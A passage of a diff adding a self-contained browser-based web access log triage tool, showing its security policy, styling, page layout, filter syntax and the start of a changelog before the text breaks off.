@@ -1,0 +1,2059 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- Hard block on network access, and only the one script in this page may run (pinned by hash).
+     Any edit to the script body changes its hash and the browser will refuse to run it until the hash is updated.
+     Recompute (run in the folder holding this file):
+     python3 -c "import hashlib,base64;s=open('web-log-triage.html',encoding='utf-8').read();b=s.split('<scr'+'ipt>')[-1].split('</scr'+'ipt>')[0];print('sha256-'+base64.b64encode(hashlib.sha256(b.encode()).digest()).decode())"
+-->
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'sha256-bPZk7ZkLh14ngJrVkYW1JHuCv8wCz0WnTXZCvcs5VYI='; style-src 'unsafe-inline'; object-src 'none'; worker-src 'none'; img-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'">
+<title>Web access log triage</title>
+<style>
+:root{
+  --bg:#EEF1F4; --panel:#FFFFFF; --soft:#F4F6F8; --ink:#1C2733; --muted:#5B6B7A; --rule:#D5DCE3;
+  --allow:#2F7D6D; --block:#B23A2E; --other:#8C96A3; --s2:#2F7D6D; --s3:#5E7FA8; --s4:#C08A1E; --s5:#B23A2E; --so:#8C96A3; --hit:rgba(178,58,46,.07); --focus:#2457A6; --on-focus:#FFFFFF;
+  --bar:rgba(36,87,166,.13); --shade:rgba(238,241,244,.62);
+  --sans:"Segoe UI Variable Text","Segoe UI",system-ui,-apple-system,"Helvetica Neue",Arial,sans-serif;
+  --mono:ui-monospace,"Cascadia Mono","SF Mono",Consolas,"Liberation Mono",monospace;
+  color-scheme:light dark;
+}
+@media (prefers-color-scheme:dark){
+  :root{
+    --bg:#12171D; --panel:#1A2129; --soft:#151B22; --ink:#DDE4EA; --muted:#8E9BA8; --rule:#2C3641;
+    --allow:#4FA894; --block:#E06A5B; --other:#6F7B88; --s2:#4FA894; --s3:#86A2C8; --s4:#D9A441; --s5:#E06A5B; --so:#6F7B88; --hit:rgba(224,106,91,.10); --focus:#7FA6E8; --on-focus:#0E1621;
+    --bar:rgba(127,166,232,.16); --shade:rgba(18,23,29,.62);
+  }
+}
+*{box-sizing:border-box}
+html,body{margin:0;background:var(--bg);color:var(--ink);font:14px/1.45 var(--sans);font-variant-numeric:tabular-nums}
+h1{font-size:20px;margin:0;font-weight:650;letter-spacing:-.01em}
+h2{font-size:15px;margin:0;font-weight:620}
+p{margin:0}
+.muted{color:var(--muted)}
+.mono{font-family:var(--mono);font-size:12.5px}
+:focus-visible{outline:2px solid var(--focus);outline-offset:2px}
+[hidden]{display:none!important}
+
+.top{display:flex;flex-wrap:wrap;gap:12px 24px;align-items:center;justify-content:space-between;padding:14px 24px;background:var(--panel);border-bottom:1px solid var(--rule);position:sticky;top:0;z-index:5}
+.sub{margin-top:2px;color:var(--muted);font-size:13px}
+.actions{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.btn{font:inherit;color:var(--ink);background:var(--panel);border:1px solid var(--rule);border-radius:5px;padding:6px 12px;cursor:pointer;line-height:1.3;white-space:nowrap}
+.btn:hover{border-color:var(--muted)}
+.btn:disabled{opacity:.45;cursor:default}
+.btn.primary{background:var(--focus);border-color:var(--focus);color:var(--on-focus);font-weight:600}
+.btn.small{padding:4px 10px;font-size:13px}
+.seg{display:inline-flex;border:1px solid var(--rule);border-radius:5px;overflow:hidden}
+.seg button{font:inherit;font-size:13px;border:0;background:var(--panel);color:var(--muted);padding:6px 11px;cursor:pointer}
+.seg button+button{border-left:1px solid var(--rule)}
+.seg button[aria-pressed="true"]{color:var(--ink);font-weight:600;box-shadow:inset 0 -2px 0 var(--focus);background:var(--soft)}
+
+.empty{max-width:680px;margin:56px auto;padding:32px 36px;border:2px dashed var(--rule);border-radius:10px;background:var(--panel)}
+.empty h2{font-size:22px;font-weight:650;letter-spacing:-.01em;margin-bottom:10px}
+.empty p{margin-bottom:14px;color:var(--muted);max-width:62ch}
+.empty dl{margin:18px 0 0;display:grid;grid-template-columns:max-content 1fr;gap:6px 16px}
+.empty dt{font-weight:600}
+.empty dd{margin:0;color:var(--muted)}
+
+main{padding:16px 24px 56px;display:flex;flex-direction:column;gap:14px;max-width:1680px;margin:0 auto}
+.panel{background:var(--panel);border:1px solid var(--rule);border-radius:6px;padding:14px 16px}
+.status{display:flex;flex-direction:column;gap:4px}
+.st-count{font-size:20px;font-weight:650;letter-spacing:-.01em;line-height:1.25}
+.st-range{font-size:14px;color:var(--ink);font-variant-numeric:tabular-nums}
+.st-label{font-weight:600}
+.ingested{margin-top:10px;padding-top:10px;border-top:1px solid var(--rule)}
+.ingested h3{font-size:13px;font-weight:620;margin:0 0 4px}
+.if-grid{display:grid;grid-template-columns:minmax(0,max-content) minmax(0,max-content) max-content minmax(0,1fr);gap:2px 22px;font-size:13px;align-items:baseline}
+.if-h{font-size:12px;color:var(--muted);font-weight:600}
+.if-hash{font:11.5px var(--mono);color:var(--muted);word-break:break-all;user-select:all}
+.if-name{font:12.5px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.if-fmt{color:var(--muted)}
+.if-n{text-align:right;color:var(--muted)}
+@media (max-width:640px){.if-grid{grid-template-columns:1fr}.if-n{text-align:left}}
+.status .warn{color:var(--block);font-size:13px}
+
+.filter{display:flex;gap:8px}
+.filter input{flex:1;min-width:0;font:14px var(--mono);color:var(--ink);background:var(--panel);border:1px solid var(--rule);border-radius:5px;padding:9px 12px}
+.filter input:focus{border-color:var(--focus);outline:none;box-shadow:0 0 0 3px var(--bar)}
+.help{font-size:13px}
+.help table{border-collapse:collapse}
+.help td{padding:3px 18px 3px 0;vertical-align:top}
+.help td:first-child{font-family:var(--mono);font-size:12.5px;white-space:nowrap}
+.chips{display:flex;flex-wrap:wrap;gap:6px;min-height:0}
+.chip{display:inline-flex;align-items:center;gap:4px;font:12.5px var(--mono);background:var(--panel);border:1px solid var(--rule);border-left:3px solid var(--focus);border-radius:3px;padding:2px 2px 2px 8px}
+.chip.neg{border-left-color:var(--block)}
+.chip.time{border-left-color:var(--muted)}
+.chip button{font:inherit;border:0;background:none;color:var(--muted);cursor:pointer;padding:0 6px;font-size:15px;line-height:1}
+.chip button:hover{color:var(--ink)}
+.ferr{color:var(--block);font-size:13px}
+
+.tl-head{display:flex;flex-wrap:wrap;align-items:center;gap:8px 18px;margin-bottom:8px}
+.legend{display:flex;flex-wrap:wrap;gap:14px;font-size:13px;color:var(--muted)}
+.legend span::before{content:"";display:inline-block;width:10px;height:10px;border-radius:2px;margin-right:6px;vertical-align:-1px;background:var(--c)}
+.tl-wrap{position:relative}
+#tl{display:block;width:100%;height:160px;cursor:crosshair;touch-action:none}
+.tip{position:absolute;pointer-events:none;background:var(--panel);border:1px solid var(--rule);border-radius:5px;padding:6px 9px;font-size:12.5px;box-shadow:0 4px 14px rgba(0,0,0,.14);white-space:nowrap;z-index:2}
+.hint{font-size:12.5px;color:var(--muted);margin-top:4px}
+
+.grid2{display:grid;grid-template-columns:minmax(320px,5fr) 8fr;gap:14px;align-items:start}
+@media (max-width:1100px){.grid2{grid-template-columns:1fr}}
+.sec-head{margin-bottom:10px}
+
+.finding{border-left:3px solid var(--other);padding:2px 0 2px 12px;margin-top:16px}
+.finding:first-child{margin-top:4px}
+.finding.first{border-left-color:var(--block)}
+.finding header{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap}
+.finding h3{font-size:14px;margin:0;font-weight:620}
+.lvl{font-size:12px;color:var(--muted)}
+.finding.first .lvl{color:var(--block);font-weight:600}
+.finding .why{font-size:12.5px;color:var(--muted);margin:2px 0 6px;max-width:70ch}
+.frow{display:flex;flex-wrap:wrap;column-gap:10px;row-gap:0;align-items:baseline;width:100%;text-align:left;font:inherit;color:inherit;background:none;border:0;border-radius:4px;padding:3px 6px;margin-left:-6px;cursor:pointer}
+.frow:hover{background:var(--soft)}
+.frow .k{font:12.5px var(--mono);flex:0 0 auto;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.frow .d{font-size:12.5px;color:var(--muted);flex:1 1 220px;min-width:0}
+.none{font-size:13px;color:var(--muted)}
+
+.topgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:18px 22px}
+.tcard header{display:flex;justify-content:space-between;align-items:baseline;border-bottom:1px solid var(--rule);padding-bottom:4px;margin-bottom:4px}
+.tcard h3{font-size:13px;margin:0;font-weight:620}
+.tcard header span{font-size:12px;color:var(--muted)}
+.trow{position:relative;display:flex;gap:8px;align-items:baseline;width:100%;font:inherit;color:inherit;background:none;border:0;padding:3px 4px;cursor:pointer;text-align:left;border-radius:3px}
+.trow:hover{outline:1px solid var(--rule)}
+.trow .bar{position:absolute;left:0;top:2px;bottom:2px;background:var(--bar);border-radius:2px;pointer-events:none}
+.trow .v{position:relative;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font:12.5px var(--mono)}
+.trow .v small{font-family:var(--sans);color:var(--muted);font-size:12px;margin-left:6px}
+.trow .n{position:relative;font-size:12.5px;color:var(--muted)}
+
+.ev-head{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px}
+.ev-actions{display:flex;gap:8px}
+/* Table panes scroll on their own so headers stay pinned, but once a pane reaches its top or bottom the wheel
+   carries on to the page (no overscroll containment). Capped so some page always shows around them. */
+.tablewrap{overflow:auto;max-height:calc(100vh - 230px);min-height:120px;border:1px solid var(--rule);border-radius:5px}
+table.ev{border-collapse:collapse;width:100%;font-size:13px}
+table.ev th{position:sticky;top:0;z-index:1;background:var(--soft);text-align:left;font-weight:600;padding:7px 10px;white-space:nowrap;box-shadow:inset 0 -1px 0 var(--rule),0 2px 4px rgba(0,0,0,.06)}
+.psize{display:inline-flex;align-items:center;gap:6px}
+.psize input{width:84px;font:13px var(--sans);color:var(--ink);background:var(--panel);border:1px solid var(--rule);border-radius:5px;padding:4px 8px}
+.psize input:focus{border-color:var(--focus);outline:none;box-shadow:0 0 0 3px var(--bar)}
+.psize input[aria-invalid="true"]{border-color:var(--block)}
+table.ev td{padding:5px 10px;border-bottom:1px solid var(--rule);white-space:nowrap;max-width:380px;overflow:hidden;text-overflow:ellipsis}
+table.ev.fixed{table-layout:fixed}
+table.ev.fixed td{max-width:none}
+table.ev.fixed th{overflow:hidden;text-overflow:ellipsis}
+table.ev th{cursor:grab;user-select:none}
+table.ev th.dragging{opacity:.45}
+table.ev th.drop-before{box-shadow:inset 3px 0 0 var(--focus),inset 0 -1px 0 var(--rule)}
+table.ev th.drop-after{box-shadow:inset -3px 0 0 var(--focus),inset 0 -1px 0 var(--rule)}
+table.ev th .rs{position:absolute;top:0;right:0;bottom:0;width:8px;cursor:col-resize;touch-action:none}
+table.ev th .rs::after{content:"";position:absolute;top:22%;bottom:22%;right:3px;width:2px;border-radius:1px;background:var(--rule)}
+table.ev th .rs:hover::after,body.col-resizing table.ev th .rs::after{background:var(--focus)}
+body.col-resizing{cursor:col-resize;user-select:none}
+table.ev tbody tr{cursor:pointer}
+table.ev tbody tr:hover{background:var(--soft)}
+table.ev tbody tr:focus-visible{outline-offset:-2px}
+td.m{font:12.5px var(--mono)}
+.act::before{content:"";display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:7px;background:var(--c,var(--other))}
+.v-allowed{--c:var(--allow)} .v-blocked{--c:var(--block)} .v-other{--c:var(--other)}
+.devs{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:12px}
+.dev{border:1px solid var(--rule);border-radius:6px;padding:14px 16px;background:var(--soft)}
+.dmodel{font-size:24px;font-weight:680;letter-spacing:-.02em;line-height:1.15;word-break:break-word}
+.dmodel.placeholder{color:var(--muted)}
+.dclass{color:var(--muted);margin:3px 0 12px;font:12.5px var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dev dl{display:grid;grid-template-columns:max-content 1fr;gap:3px 14px;margin:0 0 4px;font-size:13px}
+.dev dt{color:var(--muted)}
+.dev dd{margin:0;word-break:break-word}
+.dev dd.m{font:12.5px var(--mono)}
+.dnotes{margin:10px 0;padding:0;list-style:none;font-size:12.5px;color:var(--muted);display:flex;flex-direction:column;gap:4px}
+.dnotes li::before{content:"Inferred: ";font-weight:600;color:var(--ink)}
+.skipped summary{cursor:pointer;font-size:13px;color:var(--muted)}
+.skipped pre{white-space:pre-wrap;word-break:break-all;font:12px/1.5 var(--mono);background:var(--soft);border:1px solid var(--rule);border-radius:5px;padding:8px;margin:6px 0 0}
+.mxwrap{max-height:min(70vh,640px)}
+table.mx th{cursor:pointer}
+table.mx th.num,table.mx td.num{text-align:right}
+table.mx td.num{font-variant-numeric:tabular-nums}
+.pager{display:flex;gap:12px;align-items:center;justify-content:flex-end;margin-top:10px;font-size:13px;color:var(--muted)}
+
+.drawer{position:fixed;top:0;right:0;bottom:0;width:min(580px,100vw);background:var(--panel);border-left:1px solid var(--rule);box-shadow:-10px 0 30px rgba(0,0,0,.18);overflow:auto;z-index:20;padding:16px 20px 32px}
+.drawer header{display:flex;justify-content:space-between;align-items:center;gap:10px}
+.drawer .meta{margin:6px 0 12px;font-size:13px}
+.drawer .dacts{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
+.kv{border-collapse:collapse;width:100%;font-size:12.5px}
+.kv th{text-align:left;font:12.5px var(--mono);color:var(--muted);font-weight:400;padding:3px 12px 3px 0;vertical-align:top;white-space:nowrap}
+.kv td{padding:1px 0}
+.kv button{font:12.5px var(--mono);color:var(--ink);background:none;border:0;padding:2px 4px;margin-left:-4px;border-radius:3px;cursor:pointer;text-align:left;word-break:break-all}
+.kv button:hover{background:var(--soft)}
+.drawer pre{white-space:pre-wrap;word-break:break-all;font:12px/1.5 var(--mono);background:var(--soft);border:1px solid var(--rule);border-radius:5px;padding:10px;margin:14px 0 0}
+
+#about{border:1px solid var(--rule);border-radius:8px;background:var(--panel);color:var(--ink);padding:18px 22px 22px;width:min(640px,calc(100vw - 32px));max-height:min(80vh,760px);overflow:auto;box-shadow:0 18px 50px rgba(0,0,0,.28)}
+#about::backdrop{background:rgba(10,14,20,.45)}
+#about header{display:flex;justify-content:space-between;align-items:center;gap:12px;margin-bottom:12px}
+#about h2{font-size:18px}
+#about h3{font-size:14px;font-weight:620;margin:18px 0 6px;padding-top:12px;border-top:1px solid var(--rule)}
+.about-meta{display:grid;grid-template-columns:max-content 1fr;gap:4px 16px;margin:0 0 8px;font-size:13px}
+.about-meta dt{color:var(--muted)}
+.about-meta dd{margin:0}
+.about-meta dd.m{font:12px var(--mono);word-break:break-all;user-select:all}
+.cl{margin-top:12px}
+.cl h4{margin:0 0 3px;font-size:13.5px;font-weight:650;display:flex;gap:10px;align-items:baseline}
+.cl h4 span{font-weight:400;color:var(--muted);font-size:12.5px}
+.cl ul{margin:0;padding-left:18px;font-size:13px}
+.cl li{margin:2px 0}
+.progress{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);background:var(--panel);border:1px solid var(--rule);border-radius:6px;padding:10px 14px;box-shadow:0 6px 20px rgba(0,0,0,.18);display:flex;gap:12px;align-items:center;z-index:30;font-size:13px;min-width:min(420px,90vw)}
+.pbar{flex:0 0 140px;height:6px;background:var(--soft);border-radius:3px;overflow:hidden}
+#pfill{height:100%;width:0;background:var(--focus)}
+.drop{position:fixed;inset:12px;border:3px dashed var(--focus);border-radius:12px;background:var(--shade);display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:650;z-index:40;pointer-events:none}
+@media (max-width:640px){
+  .top,main{padding-left:14px;padding-right:14px}
+  .empty{margin:24px 14px;padding:22px}
+  .empty dl{grid-template-columns:1fr}
+}
+
+
+.dhead{display:flex;align-items:flex-start;justify-content:space-between;gap:8px}
+.dhead .dmodel{flex:1;min-width:0}
+.btn.ghost{border-color:transparent;background:transparent;color:var(--muted)}
+.btn.ghost:hover{border-color:var(--rule);color:var(--ink)}
+.btn.danger{color:var(--block)}
+.btn.danger:hover{border-color:var(--block)}
+.rename-in{flex:1;min-width:0;font:600 18px var(--sans);color:var(--ink);background:var(--panel);border:1px solid var(--focus);border-radius:5px;padding:4px 8px;box-shadow:0 0 0 3px var(--bar)}
+.renamed{font-size:12px;color:var(--muted);margin:3px 0 0}
+.sid{display:inline-block;font:11px var(--mono);border:1px solid var(--rule);border-radius:3px;padding:0 5px;margin-right:8px;color:var(--muted);vertical-align:1px}
+.src-acts{margin:10px 0 0;display:flex;flex-wrap:wrap;gap:6px}
+.status .note{color:var(--muted);font-size:13px}
+/* ---- web log additions ---- */
+.sc{display:inline-flex;align-items:center;gap:6px;font:12.5px var(--mono)}
+.sc::before{content:"";width:8px;height:8px;border-radius:50%;background:var(--so)}
+.sc-2xx::before{background:var(--s2)} .sc-3xx::before{background:var(--s3)} .sc-4xx::before{background:var(--s4)} .sc-5xx::before{background:var(--s5)}
+table.ev tbody tr.hit{background:var(--hit)}
+table.ev tbody tr.hit td:first-child{box-shadow:inset 3px 0 0 var(--s5)}
+table.ev th.num,table.ev td.num{text-align:right}
+table.cv th{cursor:pointer}
+.cvwrap{max-height:min(70vh,640px)}
+.cvctl{display:flex;flex-wrap:wrap;gap:10px;align-items:center}
+.drawer.wide{width:min(1100px,100vw)}
+.cv-who{font-size:20px;font-weight:650;margin:6px 0 8px;word-break:break-all}
+.cv-meta{display:grid;grid-template-columns:max-content 1fr;gap:3px 14px;margin:0 0 12px;font-size:13px}
+.cv-meta dt{color:var(--muted)} .cv-meta dd{margin:0;word-break:break-word}
+.transcript{border:1px solid var(--rule);border-radius:5px}
+/* The conversation transcript is not a scroller of its own: the panel scrolls, and the header sticks to the panel's top edge. */
+table.tr{table-layout:fixed}
+table.tr td{max-width:none}
+table.tr th{top:-16px}
+td.pat .rule{margin-right:4px;font-size:11.5px;padding:0 6px;line-height:1.5}
+.rtip.float{display:block;position:fixed;z-index:60;margin:0}
+table.tr td.url{max-width:520px}
+table.tr td.ref{max-width:220px;color:var(--muted)}
+table.tr tbody tr{cursor:pointer}
+.rulehits{display:flex;flex-wrap:wrap;gap:6px;margin:0 0 12px}
+.rulehits{margin-bottom:4px!important}
+.rule{position:relative;display:inline-block;font-size:12px;border:1px solid var(--s5);color:var(--s5);border-radius:3px;padding:1px 7px;cursor:help}
+.rule.info{border-color:var(--rule);color:var(--muted);font-size:11.5px;padding:0 6px}
+.rule:focus-visible{outline:2px solid var(--focus);outline-offset:2px}
+.rtip{display:none;position:absolute;left:0;top:100%;z-index:40;width:min(400px,80vw);margin-top:0;padding:10px 12px;background:var(--panel);color:var(--ink);border:1px solid var(--rule);border-radius:6px;box-shadow:0 10px 28px rgba(0,0,0,.22);font-size:12.5px;line-height:1.45;white-space:normal;cursor:auto;text-align:left}
+.rule::after{content:"";position:absolute;left:0;right:0;top:100%;height:6px}
+.rule:hover>.rtip,.rule:focus>.rtip,.rule:focus-within>.rtip{display:block}
+.finding header .rule{margin-left:auto}
+.finding header .rtip{left:auto;right:0}
+.rt-l{display:block;font-weight:600;margin-top:6px;color:var(--muted);font-size:11.5px}
+.rt-l:first-child{margin-top:0}
+.rtip code{display:block;font:12px var(--mono);background:var(--soft);border:1px solid var(--rule);border-radius:4px;padding:3px 6px;margin-top:2px;word-break:break-all;color:var(--ink)}
+.rt-refs{display:flex;flex-direction:column;gap:2px;margin-top:8px;padding-top:6px;border-top:1px solid var(--rule)}
+.rtip a,.lead-refs a{color:var(--focus)}
+.lead-refs{white-space:normal}
+.rh-hint{margin:0 0 12px}
+.dv{font:12.5px var(--mono);word-break:break-all;color:var(--muted)}
+.rtline p{font-size:13px;margin:2px 0}
+.rtline select{font:13px var(--sans);color:var(--ink);background:var(--panel);border:1px solid var(--rule);border-radius:5px;padding:3px 6px;margin-left:6px;max-width:100%}
+</style>
+</head>
+<body>
+<header class="top">
+  <div>
+    <h1>Web access log triage</h1>
+    <p class="sub">Runs entirely in this browser tab. Files are never uploaded.</p>
+  </div>
+  <div class="actions">
+    <label class="btn primary" for="fileInput" tabindex="0" id="openLbl">Open log files</label>
+    <input id="fileInput" type="file" multiple hidden>
+    <button class="btn" id="sampleBtn" type="button">Load sample data</button>
+    <div class="seg" role="group" aria-label="Time zone for display">
+      <button type="button" data-tz="local" aria-pressed="true">Local time</button>
+      <button type="button" data-tz="utc" aria-pressed="false">UTC</button>
+    </div>
+    <button class="btn" id="summaryBtn" type="button" hidden title="Markdown summary for the case record: file hashes, scope, filters, sites, leads and top conversations">Export case summary</button>
+    <button class="btn" id="clearBtn" type="button" hidden>Clear all</button>
+    <button class="btn" id="aboutBtn" type="button" aria-haspopup="dialog" title="Version information and changelog">About <span id="toolVer"></span></button>
+  </div>
+</header>
+
+<section id="empty" class="empty">
+  <h2>Drop web access logs anywhere on this page</h2>
+  <p>Or use Open log files. Parsing happens in this tab, and the page blocks all network requests, so customer data stays on this machine.</p>
+  <dl>
+    <dt>Reads</dt><dd>Apache and nginx Common and Combined formats, vhost_combined (site:port prefix), lines with a syslog-style prefix, and extra fields such as response time (Apache %D, nginx $request_time). Plain or .gz.</dd>
+    <dt>Does not read</dt><dd>IIS / W3C extended (#Fields header) or JSON access logs. Those lines are counted as unrecognised.</dd>
+    <dt>Time</dt><dd>Uses the timestamp and its UTC offset from each line. Lines without an offset are read as UTC and flagged.</dd>
+    <dt>Limits</dt><dd>Everything is held in memory. A few hundred MB is fine in a desktop browser. Past 1.5 million requests the rest are skipped and counted.</dd>
+    <dt>Try it</dt><dd>Load sample data shows normal traffic plus scanning, scraping, SQL injection, credential stuffing and a web shell, all on documentation-range IPs.</dd>
+  </dl>
+</section>
+
+<main id="main" hidden>
+  <div class="panel status" id="status"></div>
+
+  <section class="panel" aria-labelledby="siteHead">
+    <div class="sec-head"><h2 id="siteHead">Site in these logs</h2>
+      <p class="hint">Grouped by virtual host when the log records it, otherwise by file. Lines marked inferred are reasoning, not fact.</p></div>
+    <div id="sites" class="devs"></div>
+  </section>
+
+  <div class="filter">
+    <input id="q" type="search" spellcheck="false" autocomplete="off" aria-label="Filter" placeholder='ip=203.0.113.0/24 class=4xx,5xx path~login rule=sqli "free text"'>
+    <button class="btn" id="applyBtn" type="button">Apply</button>
+    <button class="btn" id="helpBtn" type="button" aria-expanded="false" aria-controls="help">Syntax</button>
+  </div>
+  <div id="help" class="panel help" hidden>
+    <table>
+      <tr><td>field=value</td><td>Exact match, case-insensitive. Commas mean any of: <span class="mono">status=401,403</span></td></tr>
+      <tr><td>field!=value</td><td>Exclude. <span class="mono">-field=value</span> does the same.</td></tr>
+      <tr><td>field~text</td><td>Field contains text: <span class="mono">query~select</span></td></tr>
+      <tr><td>field&gt;n, field&lt;n</td><td>Numeric compare: <span class="mono">bytes&gt;10000000</span>, <span class="mono">rt&gt;2000</span> (milliseconds)</td></tr>
+      <tr><td>ip=10.0.0.0/8</td><td>CIDR match on IPv4 clients. Wildcards work too: <span class="mono">path=/wp-*</span></td></tr>
+      <tr><td>Fields</td><td><span class="mono">ip method path query url status bytes rt user referer ua site ext param refhost file format x1…x8</span></td></tr>
+      <tr><td>source=</td><td>A site by its id from the site cards: <span class="mono">source=S2</span>, or <span class="mono">source!=S2</span> to exclude it.</td></tr>
+      <tr><td>class= rule=</td><td><span class="mono">class=4xx</span> is the status class. <span class="mono">rule=sqli</span> matches a request pattern (see Pattern matches in Top values).</td></tr>
+      <tr><td>"some text"</td><td>Searches the whole raw line. <span class="mono">-word</span> drops lines containing it.</td></tr>
+      <tr><td></td><td>Every term must match. Press Enter to apply.</td></tr>
+    </table>
+  </div>
+  <div id="chips" class="chips"></div>
+
+  <section class="panel">
+    <div class="tl-head">
+      <h2>Requests over time</h2>
+      <div class="legend">
+        <span style="--c:var(--s5)">5xx</span><span style="--c:var(--s4)">4xx</span><span style="--c:var(--s3)">3xx</span><span style="--c:var(--s2)">2xx</span><span style="--c:var(--so)">Other</span>
+      </div>
+      <button id="rangeReset" class="btn small" type="button" hidden>Clear time range</button>
+    </div>
+    <div class="tl-wrap"><canvas id="tl" aria-label="Requests over time by status class. Drag to select a time range."></canvas><div id="tlTip" class="tip" hidden></div></div>
+    <p class="hint">Drag across the chart to narrow the time range. Click a bar to select that interval.</p>
+  </section>
+
+  <div class="grid2">
+    <section class="panel">
+      <div class="sec-head"><h2>Leads worth a look</h2><p class="hint">Heuristics over the current selection. Each one is a question to verify against the logs, not a verdict.</p></div>
+      <div id="findings"></div>
+    </section>
+    <section class="panel">
+      <div class="sec-head"><h2>Top values</h2><p class="hint">Click a value to filter to it. Shift-click to exclude it, which is how you strip out known noise.</p></div>
+      <div id="tops" class="topgrid"></div>
+    </section>
+  </div>
+
+  <section class="panel">
+    <div class="ev-head">
+      <div><h2>Conversations</h2><p class="hint" style="margin-top:2px">Requests grouped by client, user agent and site into sessions. Click a heading to sort, drag it to move, drag its right edge to resize. Click a row to read the conversation in order.</p></div>
+      <div class="cvctl">
+        <label class="psize" for="cvGap">New after
+          <input id="cvGap" type="text" inputmode="numeric" value="30" autocomplete="off" title="Minutes of inactivity that end a conversation (1 to 1,440)"> min idle
+        </label>
+        <button id="cvColReset" class="btn small" type="button" title="Restore the default column order and widths">Reset columns</button>
+        <button id="cvExport" class="btn small" type="button" title="Every conversation in the current selection, not just the rows shown">Export conversations CSV</button>
+      </div>
+    </div>
+    <p id="cvInfo" class="hint" style="margin:0 0 8px"></p>
+    <div class="tablewrap" id="cvWrap"><table class="ev cv"><thead id="cvHead"></thead><tbody id="cvBody"></tbody></table></div>
+    <div class="pager">
+      <label class="psize" for="cvPageSize">Rows per page
+        <input id="cvPageSize" type="text" inputmode="numeric" list="pageSizes" value="100" autocomplete="off" title="Pick a size or type any number from 1 to 5,000, then press Enter">
+      </label>
+      <button id="cvPrev" class="btn small" type="button">Previous</button><span id="cvPageInfo"></span><button id="cvNext" class="btn small" type="button">Next</button>
+    </div>
+  </section>
+
+  <section class="panel">
+    <div class="ev-head">
+      <div><h2>Requests</h2><p class="hint" style="margin-top:2px">Drag a column header to move it. Drag its right edge to resize. Rows with request-pattern matches are marked; a tool user agent alone does not mark a row.</p></div>
+      <div class="ev-actions">
+        <button id="colReset" class="btn small" type="button" title="Restore the default column order and widths">Reset columns</button>
+        <button id="sortBtn" class="btn small" type="button">Newest first</button>
+        <button id="exportBtn" class="btn small" type="button">Export filtered CSV</button>
+      </div>
+    </div>
+    <div class="tablewrap" id="evWrap"><table class="ev"><thead id="evHead"></thead><tbody id="evBody"></tbody></table></div>
+    <div class="pager">
+      <label class="psize" for="pageSize">Rows per page
+        <input id="pageSize" type="text" inputmode="numeric" list="pageSizes" value="100" autocomplete="off" title="Pick a size or type any number from 1 to 5,000, then press Enter">
+      </label>
+      <datalist id="pageSizes"><option value="25"><option value="50"><option value="100"><option value="250"><option value="500"><option value="1000"><option value="2500"><option value="5000"></datalist>
+      <button id="prevBtn" class="btn small" type="button">Previous</button><span id="pageInfo"></span><button id="nextBtn" class="btn small" type="button">Next</button>
+    </div>
+  </section>
+</main>
+
+<div id="progress" class="progress" hidden role="status"><div class="pbar"><div id="pfill"></div></div><span id="ptext">Reading…</span></div>
+<div id="dropOverlay" class="drop" hidden>Drop to load</div>
+<aside id="drawer" class="drawer" hidden aria-label="Details"></aside>
+<div id="floatTip" class="rtip float" role="tooltip" hidden></div>
+<dialog id="about" aria-labelledby="aboutTitle">
+  <header><h2 id="aboutTitle">Web access log triage</h2><button class="btn small" type="button" id="aboutClose">Close</button></header>
+  <dl class="about-meta">
+    <dt>Version</dt><dd id="aboutVer"></dd>
+    <dt>Script SHA-256</dt><dd class="m" id="aboutFp"></dd>
+    <dt>Network</dt><dd>None in the background. The page's security policy blocks every network request, and only the script whose hash is shown above is allowed to run. Reference links in explainers open an external page in a new tab only when you click them, and carry no log data.</dd>
+  </dl>
+  <p class="hint">The script hash is the fingerprint recorded in every case summary. It changes with any edit to the code, so it identifies exactly which build produced a summary.</p>
+  <h3>Changelog</h3>
+  <div id="changelog"></div>
+</dialog>
+
+<script>
+(function () {
+'use strict';
+
+/* ================= versioning ================= */
+const TOOL_VERSION = '1.3.0';   // bump on every change committed to Git, and add a CHANGELOG entry
+const CHANGELOG = [
+  ['1.3.0', '2026-10-13', [
+    'Pattern matches show as boxed badges with the hover/focus explainer everywhere they appear: conversation transcripts, the Requests table and request details.',
+    'Explainers open in a floating panel, so they are no longer clipped by table cells; it stays open while you move onto it, closes on Esc or when anything scrolls.',
+    'Conversation transcript columns can be resized and moved by drag (Alt+Left/Right from the keyboard), with Reset columns; your layout is kept between conversations.']],
+  ['1.2.2', '2026-10-13', [
+    'Fix: scrolling no longer gets stuck in a table pane; once a pane reaches its top or bottom the wheel carries on scrolling the page or panel. Table panes are a little shorter so the page around them stays reachable.',
+    'Conversation panel: the transcript scrolls with the panel itself, with its header pinned, instead of being a separate scrolling box.',
+    'Sample data uses only documentation-range addresses and generic names.']],
+  ['1.2.1', '2026-10-13', ['Site cards: Show only and Exclude are always shown (they were hidden when only one site was loaded) and sit on one row before Unload, with shorter labels.']],
+  ['1.2.0', '2026-10-13', [
+    'Site cards: Rename gives a site your own name, used in the cards, the conversations table and the case summary.',
+    'Site cards: Exclude hides a site from every view (a source!= filter chip); Filter to this Site now uses the same source= id.',
+    'Site cards: Unload removes a site from the session after confirmation. Files stay listed with hashes, and the status panel and case summary record what was unloaded.',
+    'Each site has a stable id (S1, S2 ...) shown on its card and usable in filters.',
+    'Fix: a line rejected after its timestamp was read no longer counts towards the missing-UTC-offset warning.']],
+  ['1.1.1', '2026-10-13', ['Fix: a quick click on a column heading straight after resizing a column now sorts, instead of being ignored.']],
+  ['1.1.0', '2026-10-13', [
